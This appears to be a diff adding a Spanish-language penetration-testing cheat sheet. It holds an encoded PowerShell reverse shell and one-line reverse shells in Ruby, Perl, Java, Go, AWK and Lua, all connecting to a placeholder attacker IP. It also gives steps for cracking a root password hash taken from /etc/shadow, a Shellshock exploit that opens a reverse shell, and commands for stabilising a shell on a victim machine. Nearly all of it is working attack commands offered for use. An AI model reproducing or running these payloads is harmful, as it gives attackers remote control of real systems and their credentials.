+  powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAJABJAFAAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAEEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+[*] RUBY
+▶ Reverse Shell en una Línea (Shell básica con TCPSocket):
+  ruby -rsocket -e'f=TCPSocket.open("$IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+▶ Reverse Shell con Sistema Operativo (Ejecutar comandos dinámicos):
+  ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+[*] PERL
+▶ Reverse Shell en una Línea (Shell básica con Socket):
+  perl -e 'use Socket;$i="$IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+▶ Reverse Shell con Fork (Usar fork para estabilidad):
+  perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+[*] JAVA
+▶ Reverse Shell en una Línea (Ejecutar shell con Runtime):
+  r = Runtime.getRuntime()
+  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+  p.waitFor()
+
+[*] GOLANG
+▶ Reverse Shell en una Línea (Compilar y ejecutar shell):
+  echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+
+[*] AWK
+▶ Reverse Shell en una Línea (Shell interactiva con inet):
+  awk 'BEGIN {s = "/inet/tcp/0/$IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+[*] LUA
+▶ Reverse Shell en una Línea (Requiere lua-socket):
+  lua -e "require('socket');require('os');t=socket.tcp();t:connect('$IP','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+[+]------------------------------[ RECURSOS ]------------------------------[+]
+* SI ES QUE SE PUEDE LEER EL etc/shadow
+▶ Para crackear contraseñas de una máquina víctima si es posible leer /etc/shadow
+  # /etc/passwd line
+  root:x:0:0:root:/root:/bin/bash
+
+  # /etc/shadow line
+  root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7:::
+  
+  # --- Copiar ambos en arvhiso distintos ---
+
+▶ Para ensamblar los dos archivos debemos ejecutar:
+  unshadow passwd.txt shadow.txt > unshadowed.txt
+
+▶ Que almacenará en el archivo unshadowed.txt lo siguiente:
+  root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:0:0:root:/root:/bin/bash
+
+▶ Procede a crackear con John:
+  john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+* EXPLOTACIÓN DE VULNERABILIDAD SHELLSHOCK
+▶ Detección (Prueba de concepto):
+  # Si el servidor es vulnerable, ejecutará el comando /usr/bin/whoami y
+  # devolverá el resultado en la respuesta HTTP.
+  curl -s -X GET "http://$IP/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
+
+▶ Explotación (RevShell)
+  # Si se observa que el comando lanzado muestra un resultado, podemos
+  # realizar una reverse shell:
+  curl -s -X GET "http://$IP/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1"
+
+▶ Referencias:
+  https://ine.com/blog/shockin-shells-shellshock-cve-2014-6271
+
+[+]------------------------------[ TRATAMIENTO TTY ]------------------------------[+]
+
+* OPERAR DESDE UNA BASH MEJORADA
+▶ Iniciar una Sesión de Script (Grabar sesión en bash):
+  script /dev/null -c bash
+
+▶ Iniciar Bash con PTY (Mejorar shell con pseudo-terminal):
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+* MANTENER ACCESO TRAS CTRL + C
+▶ Recuperar Shell tras CTRL + Z (Mantener acceso al fondo):
+  # 1. Presionar CTRL + Z
+  stty raw -echo; fg
+  # 2. Ejecutar: reset xterm
+
+* LIMPIAR Y CONFIGURAR LA SHELL DE LA VÍCTIMA
+▶ Configurar Terminal (Establecer tipo de terminal):
+  export TERM=xterm-256color
+
+▶ Alias Útiles - Listar Archivos (Crear alias para ls detallado):
+  alias ll='clear; ls -lsaht --color=auto'
+
+▶ Alias Útiles - Subir Directorio (Simplificar navegación):
+  alias ..='cd ..'
+
+▶ Configurar PATH Seguro (Definir rutas confiables):
+  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+
+* OBTENER TAMAÑO DE SHELL ATACANTE
+▶ Ver Dimensiones del Atacante (Consultar tamaño actual):
+  stty size
+  # Salida esperada: 46 190
+
+* OBTENER TAMAÑO DE SHELL VÍCTIMA
+▶ Ver Dimensiones de la Víctima (Consultar tamaño actual):
+  stty size
+  # Salida esperada: 24 80
+
+* AJUSTAR TAMAÑO DE SHELL VÍCTIMA
+▶ Ajustar Tamaño de la Víctima (Usar dimensiones del atacante):
+  stty rows 46 columns 190
+
